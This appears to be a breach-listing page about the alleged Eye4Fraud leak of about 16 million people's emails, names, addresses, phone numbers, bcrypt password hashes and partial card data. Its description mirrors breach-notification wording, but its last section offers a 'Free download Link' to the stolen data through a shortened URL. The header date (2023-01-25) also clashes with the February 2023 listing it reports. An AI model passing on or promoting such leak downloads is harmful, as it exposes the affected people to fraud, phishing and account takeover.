# Eye4Fraud database leak

## Description

2023-01-25

In February 2023, <a href="https://twitter.com/FalconFeedsio/status/1622838659689988098" target="_blank" rel="noopener">data alleged to have been taken from the fraud protection service Eye4Fraud was listed for sale on a popular hacking forum</a>. Spanning tens of millions of rows with 16M unique email addresses, the data was spread across 147 tables totalling 65GB and included both direct users of the service and what appears to be individuals who'd placed orders on other services that implemented Eye4Fraud to protect their sales. The data included names and bcrypt password hashes for users, and names, phone numbers, physical addresses and partial credit card data (card type and last 4 digits) for orders placed using the service. Eye4Fraud did not respond to multiple attempts to report the incident.

## Breached data

Email addresses, IP addresses, Names, Partial credit card data, Passwords, Phone numbers, Physical addresses

## Free download Link

[Eye4Fraud breach Free Download Link](https://tinyurl.com/2b2k277t)